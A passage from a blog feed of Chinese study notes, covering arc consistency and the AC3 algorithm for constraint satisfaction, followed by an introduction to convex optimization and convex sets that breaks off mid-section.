<strong>arc consistency</strong> 来检查。</p><p>首先给出 arc consistency 的定义：<strong>在限制图中，对于一个 constraint 对应的有向边，如果对起始结点（tail）当前定义域中<u>任意</u>指派，终止结点（head）当前定义域中都<u>存在</u>一个指派，使得二者不违反 constraint，则称这条边是一致的</strong>。</p><p>因此，我们可以发现，前面的 forward checking <strong>只是保证了指向 new assignment（head）的任意有 constraint 结点（tail）的边具有 consistency，没有检查 “unassigned 结点之间边的 consistency”</strong>。</p><p>所以，新方法应该一开始把所有的边放在一个集合中等待遍历。每一轮检查限制条件、更新定义域时，同时对其他所有有 constraint 相连的结点也进行检查（对于 unassigned 结点，一般是双向的），<strong>如果不满足，那么从起始结点的定义域中移除违反限制的取值</strong>（正是因为从起始结点移除，所以 arc consistency 的定义是 ”起始结点任意指派 -&gt; 终止 结点存在指派“）。<strong>非常难过的一点是，如果我们正在遍历 arc 检查 consistency 时，对某个结点（tail）移除了一个 value，那么之前所有指向这个结点（这时作为 head）所建立的 consistency 都不一定成立了，需要重新检查所有指向这个结点的边的 consistency</strong>。</p><p>这个优化算法的名称叫做 <strong>Forward Checking + AC3</strong>，可以保证每次指派后，限制图都有 graph arc consistency。</p><p>这个时候，我们发现每指派一步所进行的 checking 步骤（即 Graph Arc Consistency Checking）过于复杂，以至于我们应该把这个步骤单独提出为一个函数，如下：</p><p><img src="imgs/AC3.png" height="350px"></p><p>每次我们递归地指派一个结点的值，我们在检查是否违反 constraint 的时候，都要调用一次 <code>AC3</code> 函数，进行如下检查：</p><ol><li>获取当前所有结点变量及其定义域，并将限制图中每条<strong>有向边</strong>（如果限制条件是无向的，就等价于放双向边）都放入一个队列中；</li><li>当队列非空时，从队列取出一条有向边（限制条件），检查边的一致性（使用定义），如果违反，那么删去起始结点定义域中导致冲突的值，并且将当前边的起始结点<strong>作为终止结点时的</strong>所有边放入队列，等待重新检查一致性（代码就是 <code>REMOVE-INCONSISTENT-VALUES</code>）；</li><li>重复第 2 步直至队列中没有边（所有边都通过了一致性检查，又或者至少有一条边的定义域为空，即当前指派无解）；</li></ol><p>这里大家会发现，虽然这个算法确实提前避免违反限制的情况，但是时间复杂度是肉眼可见的大（时间复杂度 $O(n^2d^3)$，通过数据结构优化可以达到 $O(n^2d^2)$，n 为结点数量级，d 为 每个结点变量的定义域大小数量级）。所以这里就需要在 <strong>详细的检查以在浅处避免违反限制</strong> 和 <strong>简单的检查但平均递归深度较大时才能发现违反限制并放弃</strong> 这两种情况抉择。</p><blockquote><p>如果数据结点相当多，不希望递归深度很大，那么 AC3 算法为优；如果限制条件相当多，结点数又相对较少，不希望在检查上浪费太多时间，那么 forward checking 算法为优。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-0-Intro&quot;&gt;&lt;a href=&quot;#Chapter-0-Intro&quot; class=&quot;headerlink&quot; title=&quot;Chapter 0. Intro&quot;&gt;&lt;/a&gt;Chapter 0. Intro&lt;/h1&gt;&lt;h2 id=&quot;0-1-The-def</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="AI" scheme="https://blog.sjtuxhw.top/tags/AI/"/>
    
    <category term="Algorithm" scheme="https://blog.sjtuxhw.top/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Convex &amp; Optimizations</title>
    <link href="https://blog.sjtuxhw.top/review/convex-opt/"/>
    <id>https://blog.sjtuxhw.top/review/convex-opt/</id>
    <published>2024-06-15T07:18:39.000Z</published>
    <updated>2024-10-25T13:53:52.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Overview"><a href="#Chapter-1-Overview" class="headerlink" title="Chapter 1. Overview"></a>Chapter 1. Overview</h1><p>进入本章前复习基础的数学知识：</p><ul><li><p>Vector Norms（范数）：对于向量 $x=(x_1,x_2,\ldots,x_n)$，$l_p$-norm 定义为：</p><script type="math/tex; mode=display">||x||_p={}^p\sqrt{|x|_1^p+|x|_2^p+\cdots+|x|_n^p}</script><p>正定性：$||x||_p\ge0,\space||x||_p=0\space\iff x=0$；</p><p>非线性性：$||tx||=|t|\space||x||,\space t\in\mathbf{R}$，$||x+y||\le||x||+||y||$（这个不等式并不好证。好证的三角不等式仅限于范数为 2 的特殊情况）；</p></li><li><p>正交阵 $A^TA=I$，因此一定满秩。此外正交阵列向量（或行）一定是相互正交的向量组，且模长为 1（单位正交向量，否则 $A^TA$ 就不是单位向量了）。</p><p>正交阵可以进行对角化 $A=P^{-1}BP$（$B$ 为对角阵，$P$ 为满秩矩阵）。所谓对角化可以感性理解为将这些正交向量组移动到与给定坐标轴的单位向量方向一致的方向上。</p><p>正交变换非常好的性质是 <strong>保范性</strong>。向量经过正交变换后，范数不变（形象理解为几何形状不变）。</p></li><li><p>实对称矩阵与实二次型一一对应。</p><p>实对称阵可以不满秩。但是一定有 $n$ 个实特征值（如果有 $k$ 个相等的特征值，称该特征值为 $k$ 重特征值），或者说 $r(A)$ 个不同的实特征值。</p><p>不相同的实特征值对应的特征向量 <strong>必定相互正交</strong>。</p><p>实对称阵可以进行谱分解（或称特征分解） $A=Q\Lambda Q^T$，可以证明 $Q$ 的每一列都是 $A$ 的一个特征向量（所以 $Q$ 是正交阵），$\Lambda$ 是对角阵，每个对角元对应一个 $A$ 的特征值。</p></li><li><p>Positive definite / positive semi-definite Matrices (正定阵和半正定阵)：若对于任意的 $n$ 维向量 $x\in\mathbf{R}^n$，都有 $x^TAx\ge0$，则称 $A$ 为半正定阵。<u>正定阵是特殊的实对称矩阵，它对应的二次型是正定二次型</u>。正定阵的判定方法如下：</p><ul><li><p>矩阵为对称矩阵，且特征值均为正；</p></li><li><p>矩阵为对称矩阵，且主元符号均为正；</p></li><li><p>矩阵为对称矩阵，其子行列式均为正；</p></li></ul></li></ul><h2 id="1-1-Mathematical-Optimization"><a href="#1-1-Mathematical-Optimization" class="headerlink" title="1.1 Mathematical Optimization"></a>1.1 Mathematical Optimization</h2><p>数学上对于优化问题的定义是：</p><script type="math/tex; mode=display">\begin{aligned}&minimize&f_0(x)&\\&subject\space to&f_i(x)&\le b_i,\quad i\in[1,m]\end{aligned}</script><p>其中</p><ul><li>$x=(x_1,\ldots,x_n)$ 被称为优化变量（optimization variables）;</li><li>$f_0:\mathbf{R}^n\rightarrow\mathbf{R}$ 被称为目标函数（objective function）;</li><li><p>$f_i:\mathbf{R}^n\rightarrow\mathbf{R},i\in[1,m]$ 被称为约束函数（constraint functions）；</p></li><li><p>将使得 $f_0$ 取得最小值，且满足约束条件的向量 $x^*$ 称为最优解（optimal solution）；</p></li></ul><p>常见的应用实例有：</p><ol><li><p>portfolio optimization（投资组合优化）：</p><ul><li>variables: 在不同 assets 上投资的数量；</li><li>constraints: budgets、每个 asset 所能分配的最大/最小金额、最小回报；</li><li>objective：总体风险，或者回报额；</li></ul></li><li><p>device sizing in electronic circuits（电路设计）：</p><ul><li>variables: device widths and lengths；</li><li>constraints: manufacturing limits, timing requirements, maximum area；</li><li>objective: power consumption；</li></ul></li><li><p>data fitting</p><ul><li>variables: model parameters；</li><li>constraints: prior information, parameter limits；</li><li>objective: measure of misfit or prediction error；</li></ul></li></ol><h2 id="1-2-Solving-Optimization-Problems"><a href="#1-2-Solving-Optimization-Problems" class="headerlink" title="1.2 Solving Optimization Problems"></a>1.2 Solving Optimization Problems</h2><p>数学上如何解决这些优化问题？实际上，对于一般的优化问题，相当难以求解，可能是 NP 问题，或者说不能在多项式时间内解决的问题。</p><p>但是我们其中有一类问题是特例，人们研究出了能够高效、可靠解决这类问题的方法，它们就是 <strong>凸优化问题</strong>（Convex Optimization Problem），包括但不限于最小二乘、线性规划、二次规划等等。</p><h3 id="1-2-1-Least-Squares"><a href="#1-2-1-Least-Squares" class="headerlink" title="1.2.1 Least-Squares"></a>1.2.1 Least-Squares</h3><p>最小二乘问题的目标是 $minimize\quad||Ax-b||_2^2$</p><p>目前有准确的解析解：$x^*=(A^TA)^{-1}A^Tb$，软件可以作出精确、高效地解析和运算（时间复杂度 $O(n^2k)$ 其中 $A\in\mathbf{R}^{k\times n}$）；</p><blockquote><p>注：软件层面并不是直接使用解析解运算。有些问题即便没有解析解，也能很简单地运算。解析解是在数学讨论的范围内。</p></blockquote><h3 id="1-2-2-Linear-Programming-LP"><a href="#1-2-2-Linear-Programming-LP" class="headerlink" title="1.2.2 Linear Programming (LP)"></a>1.2.2 Linear Programming (LP)</h3><p>此后会具体阐述的问题。线性规划的定义是：</p><script type="math/tex; mode=display">\begin{aligned}&maximize&c^Tx&\\&subject\space to&a_i^Tx&\le b_i,\quad i\in[1,m]\end{aligned}</script><p>这里一般性线性规划没有解析解，但是借助数学工具，可以以确定的算法步骤，高效可靠地得到答案，时间复杂度 $O(n^2m)$；</p><p>它不像 Least-Square 一样好识别，需要问题转换的技巧；</p><h3 id="1-2-3-Convex-Optimization-Problem"><a href="#1-2-3-Convex-Optimization-Problem" class="headerlink" title="1.2.3 Convex Optimization Problem"></a>1.2.3 Convex Optimization Problem</h3><script type="math/tex; mode=display">\begin{aligned}&minimize&f_0(x)&\\&subject\space to&f_i(x)&\le b_i,\quad i\in[1,m]\end{aligned}</script><p>其中目标函数、约束函数都是凸函数。凸函数定义为：</p><script type="math/tex; mode=display">f_i(\alpha x+\beta y)\le\alpha f_i(x)+\beta f_i(y)</script><p>其中 $\alpha+\beta=1,\space\alpha\ge0,\space\beta\ge0$；</p><blockquote><p>补充：仿射函数定义为 $f_i(\alpha x+\beta y)=\alpha f_i(x)+\beta f_i(y)$；</p></blockquote><ul><li>线性规划、最小二乘法都是 Convex Optimization Problem 的特例；</li><li>没有解析解，但有确定的算法步骤，高效可靠地得到答案，时间复杂度大致为 $\max\left\{n^3,n^2m,F\right\}$，其中 $F$ 为找到 $f_i$ 的一阶、二阶导数（偏导）所需的复杂度；</li><li>难以识别，需要一些技巧。</li></ul><h3 id="1-2-4-Nonlinear-Optimization-NLP-amp-Integer"><a href="#1-2-4-Nonlinear-Optimization-NLP-amp-Integer" class="headerlink" title="1.2.4 Nonlinear Optimization (NLP) &amp; Integer"></a>1.2.4 Nonlinear Optimization (NLP) &amp; Integer</h3><ul><li>Local Optimization Methods：<strong>选好 initial guess，在 feasible point 周围进行优化</strong>；</li><li>Global Optimization Methods：类似穷极法；</li></ul><h1 id="Chapter-2-Convex-Sets"><a href="#Chapter-2-Convex-Sets" class="headerlink" title="Chapter 2. Convex Sets"></a>Chapter 2. Convex Sets</h1><h2 id="2-1-Affine-Set"><a href="#2-1-Affine-Set" class="headerlink" title="2.1 Affine Set"></a>2.1 Affine Set</h2><p><img src="cimgs/affine-set.png"></p><p>仿射集的定义：如果一个仿射集同时包含了点 $x_1$ 和 $x_2$，且二者不相同，那么通过 $x_1$ 和 $x_2$ 直线上所有点的集合都在这个仿射集中。使用 $x=\theta x_1+(1-\theta)x_2$ 表示。</p><blockquote><p>注意，$x$ 是个向量（或者说坐标点）。随着 $\theta$ 的变动，表示的点在直线上滑动。</p></blockquote><p>举例：线性不等式的解集就是一种仿射集 $\left\{x|Ax=b\right\}$（相反地，所有仿射集都能表示为一个线性不等式的解集）；</p><blockquote><p>证明前者：若 $x_1$ 和 $x_2$ 为 $Ax=b$ 的两个不相等的解，那么 $Ax_1=b$，$Ax_2=b$，因此 $A(\theta x_1+(1-\theta)x_2)=\theta Ax_1+(1-\theta)Ax_2=\theta b+(1-\theta)b=b$；</p><p>（可以由 “线性性” 得到这个结论）</p></blockquote><h2 id="2-2-Convex-Set"><a href="#2-2-Convex-Set" class="headerlink" title="2.2 Convex Set"></a>2.2 Convex Set</h2><p>凸集的定义：如果 $x_1$ 和 $x_2$ 是凸集的相异两点，那么 $x_1$ 和 $x_2$ 组成的线段上的所有点也在该凸集内。</p><p>数学表示：$C$ 为凸集 $\Longleftrightarrow$ $\forall x_1,x_2\in C,\space x_1\ne x_2,\space 0\le\theta\le1\Rightarrow \theta x_1+(1-\theta)x_2\in C$；</p><blockquote><p>在 $x_1$ 到 $x_2$ 的线段上的所有点可以由 $x=\theta x_1+(1-\theta)x_2,\space0\le\theta\le1$ 表示。</p></blockquote><p><img src="cimgs/convex-set-def.png"></p><h2 id="2-3-Convex-Combination-Convex-Hull-amp-Convex-Cone"><a href="#2-3-Convex-Combination-Convex-Hull-amp-Convex-Cone" class="headerlink" title="2.3 Convex Combination, Convex Hull &amp; Convex Cone"></a>2.3 Convex Combination, Convex Hull &amp; Convex Cone</h2><p>凸组合的定义：对于一组点 $x_1,\ldots,x_k$，任何可以由 $x=\theta_1x_1+\theta_2x_2+\cdots+\theta_kx_k$ （$\sum\limits_{i=1}^{i=k}\theta_i=1$，$\theta_i\ge0$）表示的点，所构成的集合称为 $x_1,\ldots,x_k$ 的凸组合。</p><blockquote><p>凸组合的仿射系数和为 1.</p><p>一个凸集就是其任意相异两点 $x_1,x_2$ 的凸组合。所以凸集是一种凸组合。</p></blockquote><p>凸包（Convex Hull）的定义：对于一个点集 $S$，$S$ 中所有点的凸组合就称为 $S$ 的凸包，记作 $conv\space S$；</p><blockquote><p>形象的理解就是 <strong>用橡皮筋把最外围的点都包了起来，之后形成的图形，其内部所有的点都包含于凸包</strong>。</p><p>注意！凸包中的点的凸组合不唯一。一个点可以在其他若干个点的多种凸组合中。</p></blockquote><p><img src="cimgs/convex-hull-def.png" height="150px"></p><p>锥组合（Conic Combination）的定义：对于任意两个相异点 $x_1,x_2$，任何可以由 $x=\theta_1x_1+\theta_2x_2,\space \theta_1,\theta_2\ge0$ 表示的点，所构成的集合称为 $x_1,x_2$ 的锥组合。</p><blockquote><p>注意：<strong><u>锥组合没有要求仿射系数和为 1</u>，因此并不能说锥组合等同于凸集</strong>；</p></blockquote><p>凸锥（Convex Cone）的定义：对于一个点集 $S$，$S$ 中所有点的锥组合就称为 $S$ 的凸锥；</p><p><img src="cimgs/convex-cone-def.png" height="200px"></p><p>小小总结一下：</p><p>对于 $S=\left\{x|x=\theta_1x_1+\theta_2x_2\right\}$，其中 $x_1,x_2$ 为相异两点，</p><p>如果 $\theta_1,\theta_2$ 是普通的变量，那么称 $S$ 为 $x_1,x_2$ 的线性组合；</p><p>如果 $\theta_1,\theta_2\ge0$，那么称 $S$ 为 $x_1,x_2$ 的锥组合；</p><blockquote><p> 几何角度的锥组合：$S$ 所代表的区域内任意相异两点，满足原点到该两点连线方向的<u>射线</u>所包围区域中的点都在这个集合内；</p></blockquote><p>如果 $\theta_1+\theta_2=1$，那么称 $S$ 为包含 $x_1,x_2$ 的仿射集；</p><blockquote><p>几何角度的仿射集：$S$ 所代表的区域内任意相异两点所在的<u>直线</u>上的点都在这个集合内；</p></blockquote><p>如果 $\theta_1,\theta_2\ge0$ 且 $\theta_1+\theta_2=1$，那么称 $S$ 为 $x_1,x_2$ 的凸组合，或者说 $S$ 是一个包含 $x_1,x_2$ 的凸集（但没有“凸组合”准确，因为凸组合中的点可以只由 $x_1,x_2$ 凸组合而成）。</p><blockquote><p>几何角度的凸组合：$S$ 所代表的区域内任意相异两点所在的<u>线段</u>上的点都在这个集合内；</p></blockquote><h2 id="2-4-Hyperplanes-amp-Halfspaces"><a href="#2-4-Hyperplanes-amp-Halfspaces" class="headerlink" title="2.4 Hyperplanes &amp; Halfspaces"></a>2.4 Hyperplanes &amp; Halfspaces</h2><p>超平面的定义：$\left\{x|a^Tx=b\right\}$，其中 $a\ne0$（$a$ 为普通向量，0 代表零向量）；</p><p>半空间的定义：$\left\{x|a^Tx\le b\right\}$，其中 $a\ne0$；</p><p>从几何角度看，一个 N 元一次线性等式即可代表一个 N 维超平面，其中系数向量 $a$ 是该超平面的法向量（normal vector）。</p><p>一个 N 元一次线性不等式即可代表一个 N 维半空间，其中系数向量 $a$ 是指向该半空间界面的<u>外法线方向</u>的法向量。</p><p><img src='cimgs/hyperplane-halfspace-def.png' width="500px"></p><p><code>b</code> 向量的值影响的是垂直于 <code>a</code> 方向的超平面 / 半空间的位置；</p><hr><p>结论：</p><ul><li><p>hyperplane 既是仿射集，又是凸集；</p></li><li><p>halfspace 是凸集，但不是仿射集；</p><blockquote><p>回忆一下，仿射集要求集合内任意相异两点的仿射系数和为 1 所表示的点也在这个集合中。在几何角度理解，就是 <strong>区域内任意相异两点所在的直线上的点都在这个集合内</strong>。</p></blockquote></li></ul><p>如果不从几何角度理解，就通过数学语言证明。下面以证明 “halfspace 是凸集” 这一命题为例：</p><p>假设 $x_1,x_2$ 是 halfspace $S$ 上的任意相异两点。</p><p>要证 $S$ 是凸集，即证对 $\forall x=\theta x_1+(1-\theta)x_2,\space\theta\in[0,1]$，都有 $a^Tx\le b$ 成立。</p><p>则由条件 $x_1,x_2$ 是 $S$ 上相异两点可知，$a^Tx_1\le b,\space a^Tx_2\le b$；</p><p>故 $a^Tx=a^T\theta x_1+a^T(1-\theta)x_2\le \theta b+(1-\theta)b=b$，即 $a^Tx\le b$，原命题得证。</p><p>以后对于这类简单的证明不再作赘述。</p><h2 id="2-5-Euclidean-Balls-amp-Ellipsoids"><a href="#2-5-Euclidean-Balls-amp-Ellipsoids" class="headerlink" title="2.5 Euclidean Balls &amp; Ellipsoids"></a>2.5 Euclidean Balls &amp; Ellipsoids</h2><p>欧几里得球的定义：对于一个中心点 $x_c$ 和半径 $r$，定义点集：</p><script type="math/tex; mode=display">B(x_c,r)=\left\{x|\space||x-x||_2\le r\right\}=\left\{x_c+ru|\space||u||_2\le1\right\}</script><p> 为欧几里得球；</p><blockquote><p>注：式中的范数符号已定义在 Chapter 1 中，遗忘可以前往复习。</p></blockquote><p>椭球的定义：对于中心点 $x_c$，定义点集：</p><script type="math/tex; mode=display">\begin{equation}E=\left\{x|(x-x_c)^TP^{-1}(x-x_c)\le1\right\}\end{equation}</script><p>其中 $P\in\mathbf{S}^n_{++}$ （$P$ 为正定阵，正定阵一定是对称阵），上式也被称为二次不等式（quadratic inequality）。</p><p>注意：由解析几何的知识，<strong><u>椭球的半轴向量由 $P$ 的特征向量给出</u>，<u>椭球的半轴长由对应的特征值 $\sqrt{\lambda_i}$ 给出</u></strong>;</p><blockquote><p>因此，$P=r^2I$（$I$ 为单位矩阵）时，椭球就是一个欧几里得球；所以椭球是欧几里得球的泛化（generalization）；</p><p>另注：</p><p>$\mathbf{S}^n$ 表示 $n$ 阶对称阵组成的集合；</p><p>$\mathbf{S}^n_{++}=\left\{X\in S^n|X\succ0\right\}$ 表示所有 $n$ 阶正定阵组成的集合（概率学中的协方差矩阵就是一个正定阵）；</p><p>$\mathbf{S}^n_{+}=\left\{X\in S^n|X\succeq0\right\}$ 表示所有 $n$ 阶半正定阵组成的集合；</p></blockquote><p>当然椭球也可以表示为 $E=\left\{x_c+Au|\space||u||_2\le1\right\}$，其中 $A$ 为非奇异方阵。可以形象地理解为 $A$ “记录了椭球各个方向上的半径”。</p><blockquote><p>另外需要注意的是，$P$ 可以唯一表示一个椭球，这意味着 $P$ 与椭球点集<u>一一对应</u>。</p><p>但是 $A$ 却不能唯一表示一个椭球。因为对任意正交阵 $Q$（定义 $Q^TQ=I$），$AQ$ 表示的是一个椭球。</p><p>证明：</p><script type="math/tex; mode=display">\begin{aligned}&\left\{x_c+Au|\space||u||_2\le1\right\}\\=\space&\left\{x_c+AQQ^Tu|\space||u||_2\le1\right\}\\=\space&\left\{x_c+(AQ)(Q^Tu)|\space||Q^Tu||_2\le1\right\}\quad(||u||_2=||Q^Tu||_2)\\=\space&\left\{x_c+(AQ)u|\space||u||_2\le1\right\}\quad(\forall u)\end{aligned}</script><p>其中 $||u||_2=||Q^Tu||_2$ 由正交阵的保范性（$(Qu)^T(Qu)=u^TQ^TQu=u^Tu\Longrightarrow||Qu||=||u||$）得到。</p><p>再但！如果 $A$ 是个正定阵，那么这个表示又唯一了。</p></blockquote><hr><p>结论：欧几里得球、椭球是一个凸集。</p><h2 id="2-6-Norm-Balls-amp-Norm-Cones"><a href="#2-6-Norm-Balls-amp-Norm-Cones" class="headerlink" title="2.6 Norm Balls &amp; Norm Cones"></a>2.6 Norm Balls &amp; Norm Cones</h2><p>范式球的定义：对于中心点 $x_c$ 和半径 $r$，定义点集 $N_B=\left\{x|\space||x-x_c||\le r\right\}$ 为范式球；</p><blockquote><p>欧几里得球就是 2-范数下的范式球（或称 “二阶球”，second-order Euclidean ball）。</p></blockquote><p>范式锥的定义：定义图 $N_C=\left\{(x,t)|\space||x||\le t\right\},\space x\in\mathbf{R}^n，t\in\mathbf{R}$ 为范式锥；</p><blockquote><p>这里的 “图” 和计算机中 “图” 数据结构的概念不同。</p><p>这里的 “图” 是数学中的图，表示 “N 维坐标与值的二元组” 的集合，感性理解为：通常将 N 维坐标作为 “横轴”，对应的值为 “纵轴”，作出图形。例如 $\left\{(x,f(x))|x\in\mathbf{R}^n,f(x)\in\mathbf{R}\right\}$ 就是 $n$ 维实函数 $f(x)$ 的图。</p><p>这里范式锥的定义实际上是 <strong>上境图（epigraph）</strong>，因为 $t$ 和 $x$ 不是等号关系（函数关系），而是：$||x||\le t$；因此表示的是如下图锥（实心）；</p><p>另外，如果将小于等于改为大于等于，那么就是 亚图（hypograph）；</p></blockquote><p><img src="cimgs/norm-cone-def.png"></p><blockquote><p>范数为 2 时，范式锥又称为 circular cone（圆锥）；</p><p>此时可以写作 $N_C=\left\{(x,t)|\space x^Tx\le t^2\right\},\space x\in\mathbf{R}^n，t\in\mathbf{R}$</p></blockquote><hr><p>结论：范式球、范式锥都是凸集。</p><h2 id="2-7-Polyhedra-Polytopes"><a href="#2-7-Polyhedra-Polytopes" class="headerlink" title="2.7 Polyhedra (Polytopes)"></a>2.7 Polyhedra (Polytopes)</h2><blockquote><p>多面体 Polyhedron 的复数形式。</p><p>这里要讨论的是 polytopes（多胞形，多面体的特殊情况），也就是封闭的多面体。</p><p>但有些作者把这两个词含义颠倒了。所以建议使用时，固定一种说法，然后用 “封闭的” 形容词来区分这两种情况。</p></blockquote><p>多面体的定义：可以由一组有限个线性不等式和等式的解集所描述的集合。</p><script type="math/tex; mode=display">Ax\preceq b,\quad Cx=d</script><p>其中 $A\in\mathbf{R}^{m\times n},\space C\in\mathbf{R}^{p\times n}$，$\preceq$ 为 component-wise inequality，是逐分量不等号，对每个分量都有一个不等式。这强调的是：$A$ 的每一行的行向量 $a$ 与 $x$ 点积都小于等于向量 $b$ 的对于行的值，即 $ax\le b_i$；这个不等式描述了一个半空间，因此 $Ax\preceq b$ 就描述了一组半空间。</p><p><img src="cimgs/poly-def.png"></p><p>所以说，多面体可以由一组超平面和半空间的交集来表示。</p><h2 id="2-8-Positive-Semi-definite-Cone"><a href="#2-8-Positive-Semi-definite-Cone" class="headerlink" title="2.8 Positive Semi-definite Cone"></a>2.8 Positive Semi-definite Cone</h2><p>半正定锥的定义：对于所有半正定阵构成的集合 $\mathbf{S}^n_+$ 一定是凸锥（这里不再局限于之前讨论的 “点” 了，可以扩展到其他可以通过运算来验证定义的对象上）。这个锥被称为半正定锥。</p><blockquote><p>为什么 $\mathbf{S}^n_+$ 一定是凸锥？因为任意两个半正定阵的锥组合一定还是半正定的（回忆锥组合的定义）。</p></blockquote><h2 id="2-9-Operations-that-preserve-Convexity"><a href="#2-9-Operations-that-preserve-Convexity" class="headerlink" title="2.9 Operations that preserve Convexity"></a>2.9 Operations that preserve Convexity</h2><p>介绍不改变凸性的操作。这样做的意义是，可以将上面几种基本的凸形扩展出去，方便证明某些问题的凸性，方便以后转换问题为凸问题。</p><blockquote><p>就像做微积分中的积分问题，我们先讨论几个原子函数，然后通过一些不改变积分值的运算或变换，来得到更复杂函数的积分值。</p></blockquote><p>实际的应用例如，如何判断给定集合是否为凸集？方法如下：</p><ul><li><p>根据凸集的基本定义判断：$C$ is a convex $\Longleftrightarrow x_1,x_2\in C\Rightarrow \theta x_1+(1-\theta)x_2\in C,\space\theta\in[0,1]$；</p></li><li><p><u>根据不改变凸性的操作，将问题等价转换为以上基本凸形</u>。</p></li></ul><p>那么哪些操作不改变凸性？</p><ul><li>intersection：取交集。两个凸集的交集仍然是凸集；</li><li>affine functions：仿射变换。一个凸集经过仿射变换、仿射变换逆变换后仍然是凸集；</li><li>perspective functions：透视函数变换。</li><li>linear-fractional functions：线性分式函数变换。</li></ul><h3 id="2-9-1-Intersection"><a href="#2-9-1-Intersection" class="headerlink" title="2.9.1 Intersection"></a>2.9.1 Intersection</h3><p>我们如何利用交集不改变凸性的性质来解决一些问题呢？</p><p>举个例子，$S=\left\{x\in\mathbf{R}^m|\space|p(t)|\le1,\space |t|\le\dfrac{\pi}{3}\right\}$，其中 $p(t)=\sum\limits_{k=1}^mx_k\cos kt$（$p(t)$ 为三角多项式，trigonometric polynomial）就是一个凸集。</p><p>怎么证明？想识别这个集合的凸性有点困难，因为 $m\ge5$ 的情况下甚至不能表示出这个集合，所以我们肯定不能用凸集的定义了。</p><p>我们想要化简这个集合来方便操作。试想我们定义另一个集合 $S_t=S|_t=\left\{x\in\mathbf{R}^m|\space|p(t)|\le1\right\}$，如果固定 $t$ 为某个常数，情况是不是简单了点？</p><p>这个时候 $S$ 集合就是多个 $S_t$ 集合的<strong>交集</strong>：$S=\bigcap\limits_{|t|\le\pi/3}S_t$，因此我们看看能否证明 $S_t$ 的凸性，就能直接得到 $S$ 的凸性了。</p><blockquote><p>为什么 $S$ 集合是多个 $S_t$ 集合的<strong>交集</strong>？</p><p>可以这么理解，对某个 $t$ 的 $S_t$ 中，可能包含了满足对所有 $|t|\le\dfrac{\pi}{3},|p(t)|\le1$ 的点，也可能包含仅仅在当前的 $t$ 下才满足 $|p(t)|\le1$ 的点。作交集就筛除了不满足 $|t|\le\dfrac{\pi}{3}$ 下 $|p(t)|\le1$ 条件的点。</p><p>这就是性质：</p><script type="math/tex; mode=display">\left\{x|Pred(x,y),y\in A\cup B\right\}=\left\{x|Pred(x,y),y\in A\right\}\cap\left\{x|Pred(x,y),y\in B\right\}</script></blockquote><p>结果发现 $S_t$ 相当容易判断凸性，因为这个时候 $p(t)$ 退化为了关于向量 $x$ 的线性约束条件：</p><script type="math/tex; mode=display">\begin{aligned}S_t=&\left\{x\in\mathbf{R}^m|\space|p(t)|\le1\right\}\\=&\left\{x\in\mathbf{R}^m|-1\le\left[\begin{aligned}\cos t\\\cos 2t\\\cdots\\\cos mt\end{aligned}\right]x\le1\right\}\end{aligned}</script><p>这不就是两个半空间所夹成的区域的点集（取交集）吗！我们知道 halfspace 是凸集，两个 halfspce 的交集也是凸集，因此 $S_t$ 是凸集。</p><p>因为这里 $t$ 是任意的，所以对所有固定的 $t$ 都有 $S_t$ 是凸集，而 $S$ 是所有 $|t|\le\dfrac{\pi}{3}$ 情况的 $S_t$ 的交集，所以 $S$ 是凸集。</p><h3 id="2-9-2-Affine-Function"><a href="#2-9-2-Affine-Function" class="headerlink" title="2.9.2 Affine Function"></a>2.9.2 Affine Function</h3><p>仿射函数定义为：对定义域上任意两个值 $x,y$，对任意的 $\theta\in[0,1]$，都有 $f(\theta x+(1-\theta)y)=\theta f(x)+(1-\theta)f(y)$，因此也是一种非凸非凹的函数。</p><p>假设函数 $f:\mathbf{R}^n\rightarrow\mathbf{R}^m$ 是仿射函数（就是线性变换）；</p><blockquote><p>例如自变量为向量的仿射函数 $f(x)=Ax+b$，其中 $A\in\mathbf{R}^{m\times n},b\in\mathbf{R}^m$；</p></blockquote><p>那么凸集关于仿射函数函数的像（或者说凸集经过仿射变换后得到的集合）一定是凸集：</p><script type="math/tex; mode=display">S\subseteq \mathbf{R}^n\space convex\Longrightarrow f(S)=\left\{f(x)|x\in S\right\}\space convex</script><p>逆变换也是如此。如果一个集合经过仿射变换后的像是凸集，那么原先的集合也是凸集：</p><script type="math/tex; mode=display">C\subseteq\mathbf{R}^m\space convex\Longrightarrow f^{-1}(C)=\left\{x\in\mathbf{R}^n|f(x)\in C\right\}\space convex</script><blockquote><p>甚至这个 $f$ 不是个可逆函数（比如 $f$ 不是单射函数，但 $f$ 作为一个关系而言，是可逆的），上式也成立。</p></blockquote><p>常见的仿射函数有：缩放（scaling）、平移（translation）、投影（projection）等。</p><p>仿射函数可以用在哪些题型上？</p><p>例如线性矩阵不等式的解集 $\left\{x|x_1A_1+x_2A_2+\cdots+x_mA_m\preceq B\right\}$，其中 $A_i,B\in\mathbf{S}^p$ 。</p><p>这个时候，判断这个集合的凸性可以定义一个函数 $f:\mathbf{R}^m\rightarrow\mathbf{S}^p$（将 $m$ 维向量映射到 $p$ 阶对称矩阵上），这个函数定义为 $f(x)=B-\sum\limits_{i=1}^mx_iA_i$。很容易知道 $f$ 的像（集合）一定是一个 positive semi-definite cone（半正定锥，因为对任意的 $x$ 都有 $f(x)\succeq0$，$f(x)\in \mathbf{S}^p$），即凸集，因此原集合（$f(x)$ 的逆像）也是一个凸集。</p><p>再例如双曲锥面，$\left\{x|x^TPx\le(c^Tx)^2,\space c^Tx\ge0\right\}$，其中 $P\in\mathbf{S}^n_+$；</p><p>判断这个集合为凸集，也可以构造一个函数，$f:\mathbf{R}^n\rightarrow (\mathbf{R}^n,\mathbf{R})$，即 $f(x)=(P^{1/2}x,\space c^Tx)$，其中 $(P^{1/2})^2=P$；$f$ 就是个仿射函数（可以按仿射函数定义来测试），并且 $\left\{(x,t)|\space x^Tx\le t^2\right\},\space x\in\mathbf{R}^n，t\in\mathbf{R}$（二阶范式锥）正好是双曲锥面在 $f$ 上的像，因此双曲锥面是个凸集。</p><h3 id="2-9-3-Perspective-amp-Linear-Fractional-Function"><a href="#2-9-3-Perspective-amp-Linear-Fractional-Function" class="headerlink" title="2.9.3 Perspective &amp; Linear-Fractional Function"></a>2.9.3 Perspective &amp; Linear-Fractional Function</h3><p>透视函数定义为 